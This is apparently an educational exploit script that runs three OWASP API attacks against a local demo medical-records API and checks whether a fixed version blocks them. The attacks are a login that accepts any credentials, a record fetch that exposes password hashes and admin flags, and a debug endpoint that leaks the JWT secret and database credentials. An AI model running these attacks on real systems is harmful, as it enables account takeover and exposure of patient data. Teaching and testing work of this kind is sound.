"""
Attack script: Mobile API exploit against vulnerable/mobile_api.py
For security education only - run only against localhost demo instances.

Demonstrates:
  - OWASP API2:2023  Broken Authentication                  (POST /mobile/login)
  - OWASP API3:2023  Broken Object Property Level Auth      (GET /mobile/patient/{id})
  - OWASP API9:2023  Improper Inventory Management          (GET /mobile/debug/{id})

Each step always prints exactly one verdict line:
  [EXPLOIT] - attack succeeded (server is vulnerable)
  [BLOCKED] - server defended correctly
"""

import base64
import json

import requests

BASE_URL = "http://127.0.0.1:8002"

SENSITIVE_FIELDS = {"password_hash", "internal_id", "admin_flag"}


def verdict(exploited: bool) -> str:
    return "[EXPLOIT]" if exploited else "[BLOCKED]"


def print_response(response: requests.Response) -> None:
    print(f"  HTTP status : {response.status_code}")
    try:
        print(f"  Response    : {json.dumps(response.json(), indent=16)}")
    except Exception:
        print(f"  Response    : {response.text[:300]}")


def decode_jwt_payload(token: str) -> dict:
    """Decode JWT payload without verifying the signature."""
    segment = token.split(".")[1]
    segment += "=" * (4 - len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(segment))


# ---------------------------------------------------------------------------
# Step 1 - Non-expiring JWT (OWASP API2:2023)
# ---------------------------------------------------------------------------

def demonstrate_no_expiry() -> str | None:
    """
    The attacker submits random credentials.
    Vulnerable server: accepts any input and issues a JWT with no 'exp' claim.
    Secure server: rejects unknown credentials with HTTP 401.

    What the attacker gains on a vulnerable server:
      - A permanent token that survives password resets and account lockouts.
    """
    print("=" * 60)
    print("STEP 1: Non-Expiring JWT (POST /mobile/login)")
    print("=" * 60)
    print("  Sending arbitrary credentials (username='attacker', password='anything') ...")

    response = requests.post(
        f"{BASE_URL}/mobile/login",
        json={"username": "attacker", "password": "anything"},
    )
    print_response(response)

    # Determine verdict from the HTTP response alone.
    # Any 200 means the server issued a token for unregistered credentials - that is an exploit
    # regardless of whether the token also lacks an expiry claim.
    exploited = response.status_code == 200
    token = None

    if exploited:
        token = response.json().get("access_token")
        payload = decode_jwt_payload(token)
        has_exp = "exp" in payload
        print(f"  JWT payload : {json.dumps(payload, indent=14)}")
        if not has_exp:
            print("  No 'exp' claim - token is valid forever.")
        else:
            ttl = payload["exp"] - payload.get("iat", payload["exp"])
            print(f"  'exp' claim present - token expires in {ttl}s.")
        print(f"  {verdict(True)} Server issued token for unregistered user.")
    else:
        print(f"  {verdict(False)} Server rejected invalid credentials (HTTP {response.status_code}).")

    return token


# ---------------------------------------------------------------------------
# Step 2 - Excessive data exposure (OWASP API3:2023)
# ---------------------------------------------------------------------------

def demonstrate_excessive_data(token: str | None) -> None:
    """
    The attacker fetches a patient record by guessing a sequential integer ID.
    Vulnerable server: returns all internal fields (password_hash, internal_id, admin_flag).
    Secure server: strips those fields via the PatientResponse schema,
                   or returns HTTP 401/403 when no valid token is present.

    What the attacker gains on a vulnerable server:
      - password_hash for offline cracking (hashcat / john).
      - admin_flag to identify high-value accounts to target next.
    """
    print()
    print("=" * 60)
    print("STEP 2: Excessive Data Exposure (GET /mobile/patient/1)")
    print("=" * 60)

    headers = {"Authorization": f"Bearer {token}"} if token else {}
    auth_note = "with token from Step 1" if token else "with NO Authorization header"
    print(f"  Fetching patient record (id=1) {auth_note} ...")

    response = requests.get(f"{BASE_URL}/mobile/patient/1", headers=headers)
    print_response(response)

    if response.status_code != 200:
        # HTTP 401/403 means authentication was enforced - attack blocked.
        exploited = False
    else:
        patient = response.json()
        exposed = [f for f in SENSITIVE_FIELDS if f in patient]
        exploited = len(exposed) > 0
        if exploited:
            print(f"  {len(exposed)} sensitive field(s) present in response:")
            for key in exposed:
                print(f"    *** {key}: {patient[key]}  <-- SHOULD NOT BE EXPOSED")
        else:
            print(f"  Sensitive fields absent. Returned keys: {list(patient.keys())}")

    print(f"  {verdict(exploited)} ", end="")
    if exploited:
        print("Sensitive internal fields returned to unauthenticated caller.")
    elif response.status_code != 200:
        print(f"Server denied access (HTTP {response.status_code}).")
    else:
        print("Response contains only allowlisted fields.")


# ---------------------------------------------------------------------------
# Step 3 - Debug endpoint information disclosure (OWASP API9:2023)
# ---------------------------------------------------------------------------

def demonstrate_debug_exposure() -> None:
    """
    The attacker probes /mobile/debug/ with an out-of-range ID to trigger an error.
    Vulnerable server: returns a full Python stack trace and internal config
                       (DB credentials, JWT secret).
    Secure server: /mobile/debug/ does not exist (HTTP 404); the replacement
                   endpoint /mobile/record/ returns a generic error message only.

    What the attacker gains on a vulnerable server:
      - JWT secret → can forge tokens for any user, including admins.
      - DB credentials → direct database access, bypassing the API entirely.
    """
    print()
    print("=" * 60)
    print("STEP 3: Debug Endpoint Exposure (GET /mobile/debug/999)")
    print("=" * 60)
    print("  Probing debug endpoint with out-of-range ID to trigger an error ...")

    response = requests.get(f"{BASE_URL}/mobile/debug/999")
    print_response(response)

    # Determine verdict: exploited only if the response contains sensitive internal data.
    # A 404 means the endpoint was removed - that alone is [BLOCKED].
    try:
        data = response.json()
    except Exception:
        data = {}

    has_traceback = "traceback" in data
    has_config    = "internal_config" in data
    exploited     = has_traceback or has_config

    if has_traceback:
        print("  Stack trace leaked:")
        for line in data["traceback"].strip().splitlines():
            print(f"    {line}")

    if has_config:
        config = data["internal_config"]
        print("  Internal configuration leaked:")
        for key, value in config.items():
            print(f"    {key}: {value}")

    if response.status_code == 404:
        # Endpoint removed - also probe the replacement to confirm it leaks nothing.
        print()
        print("  Debug endpoint absent. Probing replacement GET /mobile/record/999 ...")
        rec = requests.get(f"{BASE_URL}/mobile/record/999")
        print_response(rec)
        try:
            rec_data = rec.json()
        except Exception:
            rec_data = {}
        rec_exploited = "traceback" in rec_data or "internal_config" in rec_data
        exploited = exploited or rec_exploited
        if rec_exploited:
            print("  Replacement endpoint leaks internal details.")

    print(f"  {verdict(exploited)} ", end="")
    if exploited:
        print("Internal details (stack trace / config) returned in response.")
    elif response.status_code == 404:
        print("Debug endpoint removed; replacement returns no internal details.")
    else:
        print("Response contains no sensitive internal details.")


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def main() -> None:
    print()
    print("  Mobile Medical Records API v2.0 - Exploit PoC")
    print("  Target:", BASE_URL)
    print("  WARNING: Run only against the local demo instance.")
    print()

    token = demonstrate_no_expiry()
    demonstrate_excessive_data(token)
    demonstrate_debug_exposure()

    print()
    print("=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print("  Step 1  POST /mobile/login      OWASP API2:2023 Broken Authentication")
    print("  Step 2  GET /mobile/patient/1   OWASP API3:2023 Broken Object Property Level Auth")
    print("  Step 3  GET /mobile/debug/999   OWASP API9:2023 Improper Inventory Management")
    print()
    print("  [EXPLOIT] = server is vulnerable   [BLOCKED] = server defended correctly")
    print("  See secure/mobile_api.py for the remediated version.")
    print()


if __name__ == "__main__":
    main()
